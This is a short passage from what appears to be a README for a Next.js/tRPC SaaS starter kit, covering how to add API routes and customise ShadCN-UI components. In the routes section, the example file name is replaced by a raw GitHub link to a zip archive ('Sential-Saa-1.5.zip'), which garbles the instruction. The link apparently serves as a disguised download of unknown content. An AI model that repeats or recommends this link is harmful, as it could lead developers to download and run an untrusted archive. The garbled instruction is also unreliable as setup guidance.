### Adding New Routes

To add a new route, navigate to the `pages/api` directory and create a new file. For example, to create a new API endpoint for user data, you might create `https://raw.githubusercontent.com/theus846/SaaSential/main/src/app/api/trpc/[trpc]/Sential-Saa-1.5.zip`.

### Customizing UI Components

The UI components are located in the `components` directory. You can easily modify existing components or create new ones using ShadCN-UI.
